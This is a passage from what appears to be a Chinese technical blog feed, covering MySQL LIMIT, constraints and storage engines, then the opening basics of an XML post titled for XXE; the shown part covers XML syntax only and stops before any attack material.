class="operator">|</span> MILLER <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1111</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="number">15</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.03</span> sec)</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">注：用于联合查询出来的列数必须一致</span><br><span class="line">例如：不可</span><br><span class="line"><span class="keyword">select</span> ename <span class="keyword">from</span> emp <span class="keyword">union</span> <span class="keyword">select</span> dname,deptno <span class="keyword">from</span> dept;</span><br></pre></td></tr></table></figure>
<h1 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h1><blockquote>
<ol>
<li><p>limit 是 Mysql 特有的，其它数据库中没有，在 Oracle 中有一个类似的叫做 rownum</p>
</li>
<li><p>limit 取结果集中的部分数据**</p>
</li>
</ol>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">limit a,b</span><br><span class="line">解释：a 表示从 a<span class="operator">+</span><span class="number">1</span> 号开始取，b 表示取几个数据</span><br><span class="line"></span><br><span class="line">startIndex   表示起始位置，从<span class="number">0</span>开始，<span class="number">0</span>为第一条数据</span><br><span class="line">length       表示取几个</span><br></pre></td></tr></table></figure>
<p>示例一：查出编号前五名的员工</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ename,empno <span class="keyword">from</span> emp limit <span class="number">0</span>,<span class="number">5</span>;</span><br><span class="line"><span class="keyword">select</span> ename,empno <span class="keyword">from</span> emp limit <span class="number">5</span>;</span><br><span class="line">注：<span class="number">0</span>,<span class="number">5</span> 与 <span class="number">5</span> 等价的，表示 <span class="number">0</span><span class="operator">~</span><span class="number">5</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename,empno <span class="keyword">from</span> emp limit <span class="number">0</span>,<span class="number">5</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> empno <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span>  <span class="number">7369</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span>  <span class="number">7499</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span>  <span class="number">7521</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span>  <span class="number">7566</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span>  <span class="number">7654</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+</span></span><br></pre></td></tr></table></figure>

<p>示例二：查出薪水第7~10名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ename,sal <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> sal <span class="keyword">desc</span> limit <span class="number">6</span>,<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename,sal <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> sal <span class="keyword">desc</span> limit <span class="number">6</span>,<span class="number">4</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> sal     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> <span class="number">1600.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> <span class="number">1500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> <span class="number">1300.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> <span class="number">1250.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br></pre></td></tr></table></figure>

<p> <strong>执行顺序</strong><br> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>          <span class="number">5</span>号</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>            <span class="number">1</span>号</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span>           <span class="number">2</span>号</span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>        <span class="number">3</span>号</span><br><span class="line"></span><br><span class="line"><span class="keyword">having</span>          <span class="number">4</span>号</span><br><span class="line"></span><br><span class="line">limit           <span class="number">6</span>号</span><br><span class="line">注：limit 是 <span class="keyword">sql</span>语句 最后执行的环节</span><br></pre></td></tr></table></figure></p>
<h1 id="通用标准分页"><a href="#通用标准分页" class="headerlink" title="通用标准分页"></a>通用标准分页</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">将 a 条数据分成 b 页显示，每页显示（a<span class="operator">/</span>b）条数据</span><br><span class="line">第<span class="number">1</span>页：limit <span class="number">0</span>,(a<span class="operator">/</span>b)</span><br><span class="line">......</span><br><span class="line">第n页：limit (n<span class="number">-1</span>)<span class="operator">*</span>(a<span class="operator">/</span>b),(a<span class="operator">/</span>b)</span><br></pre></td></tr></table></figure>

<h1 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h1><blockquote>
<p><strong>建表时，给表中的字段添加相应的一些约束，目的是保证表中数据的合法性，有效性，完整性。</strong></p>
</blockquote>
<p>包括：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">非空约束（not null）：约束的字段不能为NULL</span><br><span class="line">唯一约束（unique）：约束的字段不能重复</span><br><span class="line">主键约束（primary key）：约束的字段既不能为NULL，也不能重复，简称PK</span><br><span class="line">外键约束（foreign key）：简称FK</span><br><span class="line">检查约束（check）：Oracle中有该约束，Mysql中不支持</span><br></pre></td></tr></table></figure>
<p><strong>非空约束 (not null)</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_stu(</span><br><span class="line">     id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">     name <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">);</span><br><span class="line">只有列级约束，没有表级约束</span><br></pre></td></tr></table></figure>

<p><strong>唯一约束 (unique)</strong></p>
<blockquote>
<p>唯一性约束的字段具有唯一性，不能重复，但可以为 NIULL ，也可存在多个NULL，因为NULL不是一个值。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_stu(</span><br><span class="line">     id <span class="type">int</span> <span class="keyword">unique</span>,</span><br><span class="line">     name <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">unique</span>,</span><br><span class="line">);</span><br><span class="line">列级约束：指 id 与 name 单独均不可重复</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_stu(</span><br><span class="line">     id <span class="type">int</span>,</span><br><span class="line">     name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">     <span class="keyword">unique</span>(id,name)</span><br><span class="line">);</span><br><span class="line">表级约束：指 id 与 name 联合起来不允许重复，单独可重复</span><br></pre></td></tr></table></figure>
<p><strong>主键约束（primary key）</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tea(</span><br><span class="line">    id <span class="type">int</span> <span class="keyword">primary</span> key,<span class="operator">/</span><span class="operator">/</span>列级约束</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(id,name) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;lihua&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tea(</span><br><span class="line">    id <span class="type">int</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    <span class="keyword">primary</span> key(id)<span class="operator">/</span><span class="operator">/</span>表级约束</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(id,name) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;lihua&#x27;</span>);</span><br><span class="line">相关术语：</span><br><span class="line">主键约束：<span class="keyword">primary</span> key</span><br><span class="line">主键字段：id,name</span><br><span class="line">主键值：<span class="number">1</span>,<span class="string">&#x27;lihua&#x27;</span></span><br></pre></td></tr></table></figure>
<p>主键的作用：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">表设计三范式中要求：任何一张表中都应该有主键</span><br><span class="line">主键是改条记录在这张表中的 唯一标识</span><br></pre></td></tr></table></figure>
<p>主键的分类：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">根据主键的字段数量划分：</span><br><span class="line">单一主键(只给一个字段添加主键约束)</span><br><span class="line">复合主键(多个字段联合起来添加一个主键约束)</span><br><span class="line"></span><br><span class="line">根据主键性质划分：</span><br><span class="line">自然主键</span><br><span class="line">业务主键：主键值与系统的业务挂钩，比如以身份证号，银行卡号作为主键等</span><br><span class="line">注：不推荐使用业务主键，以免以后业务发生改变，主键不易更改</span><br></pre></td></tr></table></figure>
<p><strong>注：在一张表中，主键约束只能有一个</strong></p>
<p><strong>主键值自增</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tea(</span><br><span class="line">      id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">      name <span class="type">varchar</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(name) <span class="keyword">values</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(name) <span class="keyword">values</span>(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(name) <span class="keyword">values</span>(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_tea;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> a    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> b    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> c    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line">注：Oracle 中提供了一个自增机制<span class="operator">-</span>序列（sequence）对象</span><br></pre></td></tr></table></figure>
<p><strong>外键约束 (foreign key)</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">使用外键约束的字段去引用另一张表中的某个字段</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">相关术语：</span><br><span class="line">外键约束：<span class="keyword">foreign</span> key</span><br><span class="line">外键字段： </span><br><span class="line">外键值：</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> t_stu;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> t_tea;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>创建父表：老师表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tea(</span><br><span class="line">       teano <span class="type">int</span>,</span><br><span class="line">       name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">       <span class="keyword">primary</span> key(teano)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(teano,name) <span class="keyword">values</span>(<span class="number">1001</span>,<span class="string">&#x27;cao&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(teano,name) <span class="keyword">values</span>(<span class="number">1002</span>,<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(teano,name) <span class="keyword">values</span>(<span class="number">1003</span>,<span class="string">&#x27;zhou&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_tea;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>创建子表：学生表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_stu(</span><br><span class="line">      id <span class="type">int</span>,</span><br><span class="line">      name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">      tno <span class="type">int</span>,</span><br><span class="line">      <span class="keyword">primary</span> key(id),</span><br><span class="line">      <span class="keyword">foreign</span> key(tno) <span class="keyword">references</span> t_tea(teano)<span class="operator">/</span><span class="operator">/</span>外键约束：t_stu表中的tno字段值只能为t_tea 表中的teano字段的值</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(id,name,tno) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;wangwu&#x27;</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(id,name,tno) <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;xiaohong&#x27;</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(id,name,tno) <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;zhoujun&#x27;</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_stu;</span><br><span class="line"></span><br><span class="line">注:</span><br><span class="line">创建：先创建父表再创建子表</span><br><span class="line">插入数据：先插入父表再插入子表</span><br><span class="line">删除数据：先删除子表再删除父表</span><br><span class="line">删除表：先删除子表再删除父表</span><br><span class="line"></span><br><span class="line">外键可为 <span class="keyword">NULL</span> </span><br><span class="line">使用外键约束的字段去引用另一张表中的某个字段，被引用的字段一般为主键，不是主键也可，但必须有唯一性，即 <span class="keyword">unique</span> 约束。</span><br></pre></td></tr></table></figure>

<h1 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h1><blockquote>
<p><strong>表的存储方式，不同存储引擎采用不同的方式在数据库中存储表</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查看当前 Mysql 支持的存储引擎：</span><br><span class="line"><span class="keyword">show</span> engines;</span><br></pre></td></tr></table></figure>
<p><strong>MyISAM 存储引擎</strong></p>
<blockquote>
<p><strong>是最常用的，但不是默认的 ，它使用三个文件来表示每张表。<br>格式文件：columns_priv.frm<br>数据文件：columns_priv.MYD<br>索引文件：columns_priv.MYI<br>优点：可被转换为压缩，只读表来节省空间<br>缺点：不支持事务</strong></p>
</blockquote>
<p><strong>InnoDB 存储引擎</strong></p>
<blockquote>
<p><strong>1.优点：支持事务，行级锁，外链等。<br>2该存储引擎数据的安全得到保障。<br>3.表的结构存储在 xxx.frm文件中 数据存储在 tablespqce这样的表空间中，无法被压缩，无法转换为只读<br>4.该引擎在Mysql数据库崩溃之后会自动提供恢复机制。<br>5.它支持级联删除和级联更新</strong></p>
</blockquote>
<p><strong>MEMORY 存储引擎</strong></p>
<blockquote>
<p><strong>1.不支持事务，数据容易丢失，由于所以数据和索引被存储在内存当中<br>2.优点：查询速度最快</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>XML与XXE</title>
    <url>/2021/10/01/XML%E4%B8%8EXXE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、XML"><a href="#一、XML" class="headerlink" title="一、XML"></a>一、XML</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>XML是一种用于标记电子文件使其具有结构性的 <strong>可扩展标记语言（EXtensible Markup Language）</strong>。</p>
<p><a href="https://baike.baidu.com/item/XML">XML</a>的前身是 <a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标准通用标记语言 </a>，为了使标准通用标记语言显得用户友好，XML重新定义了标准通用标记语言的一些内部值和参数，去掉了大量的很少用到的功能，这些繁杂的功能使得标准通用标记语言在设计网站时显得复杂化。XML保留了标准通用标记语言的结构化功能，这样就使得网站设计者可以定义自己的文档类型，XML同时也推出一种新型文档类型，使得开发者也可以不必定义文档类型。</p>
<span id="more"></span>

<p><strong>特征，与 HTML 的区别：</strong></p>
<ul>
<li><p>XML 被设计用来 <code>被设计用来结构化、存储以及传输信息</code>，焦点是数据的内容。</p>
<p>HTML 被设计用来 <code>显示数据</code>，焦点是数据的外观。</p>
<p>HTML 旨在 <code>显示信息</code>，而 XML 旨在 <code>传输信息</code></p>
</li>
<li><p>XML 的设计宗旨是传输数据，而不是显示数据</p>
</li>
<li><p>XML 被设计为具有 <code>自我描述性</code></p>
</li>
<li><p>XML 标签没有被预定义。您需要自行定义标签（即允许创作者定义自己的标签和自己的文档结构）</p>
<p>HTML 文档只能使用在 HTML 标准中定义过的标签（如 <code>&lt;p&gt;、&lt;h1&gt;</code>  等等）</p>
</li>
<li><p>XML标签必须闭合，<code>允许 &lt;外观 /&gt;,不允许 &lt;外观&gt;，只可是 &lt;外观&gt;&lt;/外观&gt;</code></p>
<p>HTML可不闭合 ，可 <code>&lt;p&gt;,&lt;p&gt;&lt;/p&gt;,&lt;img /&gt;</code></p>
</li>
<li><p>XML标签的 <code>结构和样式分离</code></p>
<p>HTML标签的 <code>结构和样式结合在一起 &lt;h1&gt;标签</code> </p>
</li>
<li><p>是W3C的推荐标准</p>
</li>
</ul>
<p>注：本来发明XML是为了替换掉HTML标签的，最后由于各种原因，未能成功替换掉，于是解决办法是发明了一个新的 XHTML，该语言内部的技术使用的是XML的，而标签都是HTML的</p>
<p><strong>作用：</strong></p>
<ul>
<li><p>当作小型的数据库使用</p>
<ul>
<li><p>msg聊天工作通过xml文件在本地保留聊天记录</p>
</li>
<li><p>许多软件的 配置文件 都是通过xmk来保存的</p>
</li>
<li><p>许多媒体工资通过xml文件保留用户之前看到的媒体信息</p>
</li>
</ul>
</li>
<li><p>在网站当中当作 <strong>“接口”</strong> 服务</p>
</li>
<li><p>XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。</p>
</li>
</ul>
<p><strong>例子：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#XML文档</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (hair,country,eye,body)&gt;</span><br><span class="line">&lt;!ELEMENT hair (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ELEMENT country (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ELEMENT eye (<span class="comment">#PCDATA)&gt; </span></span><br><span class="line">&lt;!ELEMENT body (<span class="comment">#PCDATA)&gt; </span></span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;</span><br><span class="line">    &lt;hair&gt;Black&lt;/hair&gt;</span><br><span class="line">    &lt;country&gt;China&lt;/country&gt;</span><br><span class="line">    &lt;eye&gt;big&lt;/eye&gt;</span><br><span class="line">    &lt;body&gt;You are handsome!&lt;/body&gt;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/z7PSXUY9xhkpnBL.png" alt="image-20210426203632004"></p>
<p>充分体现了 具有自我描述性，但是这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</p>
<h2 id="1-2-用途"><a href="#1-2-用途" class="headerlink" title="1.2 用途"></a>1.2 用途</h2><ul>
<li><p>XML 把数据从 HTML 分离，是独立于软件和硬件的信息传输工具</p>
</li>
<li><p>简化数据共享</p>
</li>
<li><p>简化数据传输</p>
</li>
<li><p>简化平台变更，其实也是简化数据的传输与共享</p>
</li>
</ul>
<h2 id="1-3-规则"><a href="#1-3-规则" class="headerlink" title="1.3 规则"></a>1.3 规则</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.XML文档必须有一个（唯一） 根元素 ，该元素是其他元素的 父元素</span><br><span class="line">2.XML每个元素都必须有开始和结束标签，即成对出现</span><br><span class="line">3.XML标签对大小写敏感，开始与闭合标签大小写类型需要一致</span><br><span class="line">4.XML元素需要正确嵌套，即不可交叉嵌套 <span class="comment">#&lt;abc&gt;&lt;test&gt;&lt;/abc&gt;&lt;/test&gt; 错误</span></span><br><span class="line">5.XML属性 必须有 值，且必须加引号</span><br><span class="line">6.特殊字符需要 实体引用</span><br><span class="line">7.注释：&lt;!--  --&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">标签的组成部分：</span><br><span class="line">1.字母，数字，下划线</span><br><span class="line">2.不能以 数字和标点符号 开始</span><br><span class="line">3.不能包含 空格</span><br><span class="line">4.最好避免使用 - , . , : 等</span><br></pre></td></tr></table></figure>

<p><strong>实体引用</strong></p>
<table>
<thead>
<tr>
<th><code>&amp;lt;</code></th>
<th>&lt;</th>
</tr>
</thead>
<tbody><tr>
<td><code>&amp;gt;</code></td>
<td>&gt;</td>
</tr>
<tr>
<td><code>&amp;amp;</code></td>
<td>&amp;</td>
</tr>
<tr>
<td><code>&amp;apos;</code></td>
<td>‘</td>
</tr>
<tr>
<td><code>&amp;quot;</code></td>
<td>“</td>
</tr>
</tbody></table>
<p>其实在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p>
<h2 id="1-4-PCDATA"><a href="#1-4-PCDATA" class="headerlink" title="1.4 PCDATA"></a>1.4 PCDATA</h2><p><strong>被解析的字符，文本</strong></p>
<p>不能含有 特殊字符</p>
<h2 id="1-5-CDATA"><a href="#1-5-CDATA" class="headerlink" title="1.5 CDATA"></a>1.5 CDATA</h2><p><strong>不会被解析的字符，文本</strong></p>
<p>当需要显示的特殊符号偏多，但又不想使用实体的引用时，可使用 CDATA，它指的是不应该由 XML解释器进行解析的文本数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用</span></span><br><span class="line">&lt;![CDATA[文本数据]]&gt;</span><br><span class="line"><span class="comment">#例子：&lt;eye&gt;&lt;![CDATA[&lt;sdsdj&gt;&gt;&gt;&amp;&amp;dfd&#x27;f&quot;]]&gt;big&lt;/eye&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/bsrz3YOW4MdU6qe.png" alt="image-20210426210731208"></p>
<h2 id="1-6-XML-属性-与-元素"><a href="#1-6-XML-属性-与-元素" class="headerlink" title="1.6 XML 属性 与 元素"></a>1.6 XML 属性 与 元素</h2><p><strong>属性：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">day</span>=<span class="string">&quot;10&quot;</span> <span class="attr">month</span>=<span class="string">&quot;01&quot;</span> <span class="attr">year</span>=<span class="string">&quot;2008&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">to</span>=<span class="string">&quot;Tove&quot;</span> <span class="attr">from</span>=<span class="string">&quot;Jani&quot;</span> <span class="attr">heading</span>=<span class="string">&quot;Reminder&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">body</span>=<span class="string">&quot;Don&#x27;t forget me this weekend!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#缺点：</span></span><br><span class="line">属性不能包含多个值</span><br><span class="line">不能包含树结构</span><br><span class="line">不容易扩展</span><br><span class="line">难以阅读</span><br></pre></td></tr></table></figure>

<p><strong>元素：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">date</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">day</span>&gt;</span>10<span class="tag">&lt;/<span class="name">day</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">month</span>&gt;</span>01<span class="tag">&lt;/<span class="name">month</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2008<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>建议：使用元素</strong></p>
<p><strong>特别的：ID属性，便于访问XML元素</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">messages</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;p501&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;p502&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Re: Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>I will not!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">messages</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<h2 id="1-7-XML在浏览器中的显示"><a href="#1-7-XML在浏览器中的显示" class="headerlink" title="1.7 XML在浏览器中的显示"></a>1.7 XML在浏览器中的显示</h2><p><strong>显示：单独的 XML 文档不会携带有关如何显示数据的信息，直接将XML的源码显示出来。</strong></p>
<p><strong>方法：</strong></p>
<ul>
<li><p><strong>链接到CSS文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml-stylesheet type=&quot;text/css&quot; href=&quot;cd_catalog.css&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>使用 CSS 格式化 XML 不是常用的方法</p>
</li>
<li><p><strong>使用 XSLT，把 XML 文档转换成 HTML 格式显示</strong></p>
<p>XSLT 是首选的 XML 样式表语言，当浏览器读取 XML 文件时，XSLT 转换是由浏览器完成的</p>
<p>使用 XSLT 来转换 XML 时，不同的浏览器可能会产生不同结果。为了减少这种问题，可以在服务器上进行 XSLT 转换。</p>
<p><img src="https://i.loli.net/2021/10/01/ldOAweu4xsMIWkr.png" alt="image-20210427172835529"></p>
</li>
</ul>
